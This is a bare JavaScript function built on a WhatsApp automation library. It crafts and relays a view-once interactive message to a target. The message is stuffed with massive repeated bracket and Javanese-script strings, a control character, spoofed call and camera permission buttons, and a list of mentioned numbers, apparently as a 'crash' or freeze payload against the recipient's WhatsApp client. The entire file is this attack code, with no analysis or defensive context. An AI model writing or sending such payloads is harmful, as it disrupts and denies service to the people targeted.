async function SystemUi(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " 𝐔𝐢 𝐒𝐢𝐬𝐭𝐞𝐦 🦠 ",
              hasMediaAttachment: false,
            },
            body: {
              text: " 𝐔𝐢 𝐒𝐢𝐬𝐭𝐞𝐦 🦠 ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{[".repeat(10000),
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0003"
                },
                {
                  name: "single_select",
                  buttonParamsJson: "꧔꧈".repeat(3000)
                },
                {
                  name: "nested_call_permission",
                  buttonParamsJson: JSON.stringify({ status: true })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ cameraAccess: true })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              "13135550101@s.whatsapp.net",
              "13135550202@s.whatsapp.net",
              "13135550303@s.whatsapp.net",
              "13135550404@s.whatsapp.net",
              "13135550505@s.whatsapp.net",
              "13135550606@s.whatsapp.net",
              "13135550707@s.whatsapp.net",
              "13135550808@s.whatsapp.net",
              "13135550809@s.whatsapp.net",
              "13135551010@s.whatsapp.net"
            ].map(jid => ({
              tag: "to",
              attrs: { jid },
              content: undefined
            }))
          }
        ]
      }
    ]
  });
}